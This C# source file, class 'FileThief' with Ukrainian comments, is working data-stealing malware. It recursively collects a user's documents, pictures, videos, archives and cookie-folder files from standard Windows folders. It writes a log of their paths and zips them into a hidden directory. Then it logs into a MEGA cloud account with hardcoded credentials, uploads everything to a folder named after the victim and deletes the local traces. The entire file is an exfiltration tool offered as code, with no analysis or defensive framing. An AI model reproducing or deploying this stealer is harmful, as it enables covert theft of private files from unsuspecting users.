using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CG.Web.MegaApiClient;

public class FileThief
{


    /// <summary>
    /// Знайти цікаві файли, архівувати паралельно та почергово завантажити на мега
    /// </summary>
    /// <param name="LogPath">Шлях для збереження логу</param>
    /// <param name="FolderPath">Шлях для збереження архівів</param>
    /// <param name="maxFileSize">Максимальний розмір файлу, який слід додати в архів (в байтах)</param>
    /// <param name="archiveSize">Максимальний розмір одного архіву (в мегабайтах)</param>
    /// <param name="InitialFolders">Початкові файли для пошуку, по дефолту (усі стандартні місця для файлів, в тому числі документи та завантаження)</param>
    /// <param name="FileTypes">Типи файлів які слід додати, по дефолту (картинки, документи, відоси)</param>
    public static void UploadInTasks(string LogPath, string FolderPath, int maxFileSize, int archiveSize, List<string> InitialFolders = null, List<string> FileTypes = null)
    {
        int sizeMB = 0;
        //список файлів які треба завантажити
        List<FileInfo> files = FileFinder.FindFiles(InitialFolders, FileTypes, 50000, maxFileSize, out sizeMB);
        //розбиваємо цей список на списки файлів малого розміру
        List<List<FileInfo>> smolFiles = FileFinder.SplitBySize(files, archiveSize);
        //створюємо лог з усіма файлами
        FileFinder.CreateLogFile(files, LogPath, "log.txt");
        //ініціалізація користувача
        MegaUser user = new MegaUser("biba0012023@gmail.com", "Parol123");
        //завантажуємо лог та видаляємо його з ПК
        UploadAndDeleteFile(user, LogPath, "log.txt");

        //початок гачімучі з тасками
        TaskManager(smolFiles, FolderPath, user);//створити задачі по архівуванню та завантаженню

    }
    /// <summary>
    /// Функція роботи зі створенням та виконанням задач по архівуванню
    /// </summary>
    /// <param name="fileInfosArray"></param>
    /// <param name="path"></param>
    /// <param name="user"></param>
    static private async void TaskManager(List<List<FileInfo>> fileInfosArray, string path, MegaUser user)//створення масиву задач та виконання їх
    {
        //якщо папка не пуста, то видалити її вміст рекурсивно
        if (Directory.Exists(path))
        {
            Directory.Delete(path, true);

        }
        Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tТеку з архівами створено, початок архівування, всього має бути архівів:\t" + fileInfosArray.Count);
        DirectoryInfo di = Directory.CreateDirectory(path);
        di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

        List<Task> tasks = new List<Task>();

        //задаємо задачі для створення архівів зі списків файлів
        for (int currentTask = 0; currentTask < fileInfosArray.Count; currentTask++)
        {
            string ZipName = currentTask + ".zip";//робимо архіву назву з порядкового номеру
            string ZipPath = path;

            //початковий номер файлу, наприклад якщо є два списки по 200 файлів
            //перший файл першого архіву буде називатися 0.jpg
            //перший файл другого архіву - 200.jpg
            int StartFileNumber = 0;
            for (int i = 0; i < currentTask; i++)
            {
                StartFileNumber += fileInfosArray[i].Count;
            }
            List<FileInfo> currentFiles = fileInfosArray[currentTask];//передаємо список файлів для архіву
            tasks.Add(new Task(() => ZipEnjoyer.CreateZIP(currentFiles, ZipPath, ZipName, StartFileNumber)));//створюємо архів зі списку файлів
        }
        for (int i = 0; i < tasks.Count; i++)//цикл запуску задач
        {
            tasks[i].Start();
        }
        Task UltimateTask = Task.WhenAll(tasks);//задача, яка виконується після виконання всіх попередніх задач створення архівів
        UltimateTask.Wait();//чекаємо на завершення задачі з минулої строки
        Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tУсі архіви створено, завантаження файлів розпочато");

        //почергове завантаження архівів
        for (int i = 0; i < fileInfosArray.Count; i++)
        {
            UploadAndDeleteFile(user, path, i + ".zip");
        }
        Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tЗавантаження файлів завершено");


    }
    /// <summary>
    /// Завантажує файл на сервер, після цього видаляє його з ПК
    /// </summary>
    /// <param name="user">дані користувача</param>
    /// <param name="path">шлях до файлу</param>
    /// <param name="name">назва файлу</param>
    private static void UploadAndDeleteFile(MegaUser user, string path, string name)
    {
        user.UploadFileToExistingFolder(Path.Combine(path, name));//завантаження файлу
        File.Delete(Path.Combine(path, name));//видалення файлу
        Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tАрхів\t" + name + "\tвидалено");
    }


    /// <summary>
    /// Клас пошуку файлів та збереження їх у масиви
    /// </summary>
    public class FileFinder
    {
        public string path;
        public int size;
        public string name;
        public string ext;

        public FileFinder(string path, int size, string name, string ext)
        {
            this.path = path;
            this.size = size;
            this.name = name;
            this.ext = ext;
        }
        /// <summary>
        /// Отримати список файлів
        /// </summary>
        /// <param name="initialFolders">Початкові папки для пошуку</param>
        /// <param name="fileTypes">Допустимі формати файлів</param>
        /// <param name="minFileSize">Мінімальний розмір файлу</param>
        /// <param name="maxFileSize">Максимальний розмір файлу</param>
        /// <returns>Список файлів</returns>
        public static List<FileInfo> FindFiles(List<string> initialFolders, List<string> fileTypes, int minFileSize, int maxFileSize, out int oututSize)
        {
            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tПочаток пошуку файлів");
            //якщо не задані папки для пошуку, то ставимо ці
            if (initialFolders == null)
            {
                initialFolders = new List<string>() {
            Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
            Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
            Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
            Environment.GetFolderPath(Environment.SpecialFolder.Cookies),
            Environment.GetFolderPath(Environment.SpecialFolder.MyComputer),
            Environment.GetFolderPath(Environment.SpecialFolder.Recent),
            "C:/Users/"+Environment.UserName+"/Downloads/",

            };
            }
            //те саме з розширеннями файлів
            if (fileTypes == null)
            {
                fileTypes = new List<string>() {
            ".jpg",
            ".png",
            ".pdf",
            ".doc",
            ".docx",
            ".webm",
            ".mp4",
            ".mkv",
            ".avi",
            ".gif",
            ".zip",
            ".rar",
            ".7z",
            };
            }

            List<FileFinder> files = new List<FileFinder>();
            List<FileInfo> fileInfos = new List<FileInfo>();

            //знайти усі файли у папках та записати їх у масив
            //визначити типи файлів та їх розмір, те що не підходить видалити

            long fileSize = 0;//загальний розмір знайдених файлів
                              //для кожної з початкових папок шукати файли
            foreach (string folder in initialFolders)
            {
                //знаходимо усі файли в теці рекурсивно
                foreach (string filePath in GetFiles(folder))
                {
                    FileInfo fileInfo = new FileInfo(filePath);
                    //якщо файл менше максимального розміру, більше мінімального, та його розширення є в списку допустимих, то додаємо в архів
                    if (fileInfo.Length < maxFileSize && fileInfo.Length > minFileSize && fileTypes.Contains(fileInfo.Extension))
                    {
                        //файл база, записуємо
                        files.Add(new FileFinder(fileInfo.FullName, Convert.ToInt32(fileInfo.Length), fileInfo.Name, fileInfo.Extension));
                        fileSize += fileInfo.Length;
                        fileInfos.Add(fileInfo);
                    }
                }
            }

            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tПошук файлів завершено, кількість файлів: " + files.Count + "\tрозмір файлів у мегабайтах: " + (fileSize / 1000000));
            oututSize = Convert.ToInt16(fileSize / 1000000);
            return fileInfos;
        }


        /// <summary>
        /// Реверсивний пошук файлів в папці
        /// </summary>
        /// <param name="path">Початкова папка</param>
        /// <returns>Список файлів</returns>
        private static IEnumerable<string> GetFiles(string path)
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (string subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch (Exception ex)
                {
                    //Console.Error.WriteLine(ex);
                }
                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path);
                }
                catch (Exception ex)
                {
                    //Console.Error.WriteLine(ex);
                }
                if (files != null)
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        yield return files[i];
                    }
                }
            }
        }

        /// <summary>
        /// створити логфайл зі шляхами усіх файлів та їх розмірами
        /// </summary>
        /// <param name="filesList">список файлів</param>
        /// <param name="path">розташування логу</param>
        public static void CreateLogFile(List<FileInfo> filesList, string path, string fileName)
        {
            DirectoryInfo di = Directory.CreateDirectory(path);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            //Directory.CreateDirectory(path);
            File.Delete(Path.Combine(path, fileName));//видалення логу
            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tЛог видалено");

            FileStream log = File.Create(Path.Combine(path, fileName));
            using (StreamWriter writer = new StreamWriter(log))
            {
                foreach (FileInfo file in filesList)
                {
                    writer.WriteLine(file.FullName + "\t" + file.Length);
                }
            }
            log.Close();
            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tЛог створено");
        }

        public static void DeleteFolder(string folderPath)
        {
            Directory.Delete(folderPath, true);
            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tТеку\t" + folderPath + "\t видалено");

        }

        /// <summary>
        /// Розділити заданний масив файлів на масиви не перевищюючі заданий розмір
        /// </summary>
        /// <param name="files">даний масив</param>
        /// <param name="size">максимальний розмір файлів в мегабайтах</param>
        /// <returns></returns>
        public static List<List<FileInfo>> SplitBySize(List<FileInfo> files, int size)
        {
            List<List<FileInfo>> output = new List<List<FileInfo>>();
            List<FileInfo> temp = new List<FileInfo>();
            long tempSize = 0;
            foreach (var file in files)
            {
                tempSize += file.Length;
                if (tempSize < size * 1000000)
                {
                    temp.Add(file);
                }
                else
                {
                    tempSize = 0;
                    output.Add(temp);
                    temp = new List<FileInfo>();
                    temp.Add(file);
                }

            }
            output.Add(temp);



            return output;
        }

    }
    /// <summary>
    /// Клас використання MegaAPI
    /// </summary>
    public class MegaUser
    {
        MegaApiClient client;
        INode UserFolder;

        public MegaUser(string login, string password)
        {
            this.client = new MegaApiClient();
            this.client.Login(login, password);
            string FolderName = Environment.UserName + "\t" + DateTime.Now.ToString("HH:mm:ss tt");
            IEnumerable<INode> nodes = client.GetNodes();

            INode root = nodes.Single(x => x.Type == NodeType.Root);

            this.UserFolder = client.CreateFolder(FolderName, root);
        }


        public void UploadFileToExistingFolder(string path)
        {
            //Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tПочаток публікування файлу:\t"+path);

            INode myFile = client.UploadFile(path, this.UserFolder);
            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tФайл\t" + path + "\tопубліковано");

        }


    }
    /// <summary>
    /// Клас використання стиснення ZIP
    /// </summary>
    public class ZipEnjoyer
    {
        /// <summary>
        /// Створити архів з заданого списку файлів
        /// </summary>
        /// <param name="fileInfos">масив файлів</param>
        /// <param name="path">шлях створення архіву</param>
        /// <param name="ZipName">назва архіву</param>
        /// <param name="startIndex">початкове число для назв файлів всередині</param>
        public static void CreateZIP(List<FileInfo> fileInfos, string path, string ZipName = "files.zip", int startIndex = 0)
        {
            path = Path.Combine(path, ZipName);

            using (var archive = ZipFile.Open(path, ZipArchiveMode.Create))
            {
                int i = startIndex;

                foreach (FileInfo fileInfo in fileInfos)
                {
                    archive.CreateEntryFromFile(fileInfo.FullName, i + fileInfo.Extension);

                    i++;
                }
            }
            Console.WriteLine(DateTime.Now.ToString("HH:mm:ss tt") + "\tархів\t" + ZipName + "\tстворено");
            //File.SetAttributes(path, FileAttributes.Hidden);

        }

    }
}
